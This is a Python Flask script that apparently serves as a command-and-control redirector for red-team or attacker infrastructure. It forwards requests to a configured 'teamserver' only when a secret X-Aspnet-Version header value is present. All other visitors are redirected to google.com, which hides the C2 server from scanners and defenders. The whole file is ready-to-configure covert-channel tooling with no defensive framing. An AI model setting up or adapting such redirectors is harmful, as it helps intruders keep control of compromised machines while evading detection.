from flask import Flask, redirect, request, stream_with_context
import flask
import requests

app = Flask(__name__)
# Domain or IP of your c2.
SITE_NAME = "https://teamserver/"

# Variable for redirecting bad requests to your teamserver using the magic header.
REDIRECT_URL = "https://www.google.com/"

# Comment the first HEADER variable and then uncomment HEADER and HEADER_KEY to use magic headers.
#HEADER = None
HEADER = "X-Aspnet-Version"
HEADER_KEY = "1.5"


method_requests_mapping = {
    'GET': requests.get,
    'HEAD': requests.head,
    'POST': requests.post,
    'PUT': requests.put,
    'DELETE': requests.delete,
    'PATCH': requests.patch,
    'OPTIONS': requests.options,
}

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=method_requests_mapping.keys())
def teamserver(path):
    if HEADER:
        headers = flask.request.headers
        if HEADER in headers:
            if HEADER_KEY in flask.request.headers.get(HEADER):
                url = SITE_NAME + path
                requests_function = method_requests_mapping[flask.request.method]
                request = flask.request.base_url
                request = requests_function(url, stream=True, params=flask.request.args)
                response = flask.Response(stream_with_context(request.iter_content()),content_type=request.headers['content-type'],status=request.status_code)
                response.headers['Access-Control-Allow-Origin'] = '*'
                return response
            else:
                return redirect(REDIRECT_URL, code=302)
        else:
            return redirect(REDIRECT_URL, code=302)
    else:
        url = SITE_NAME + path
        requests_function = method_requests_mapping[flask.request.method]
        request = flask.request.base_url
        request = requests_function(url, stream=True, params=flask.request.args)
        response = flask.Response(flask.stream_with_context(request.iter_content()),content_type=request.headers['content-type'],status=request.status_code)
        response.headers['Access-Control-Allow-Origin'] = '*'
        return response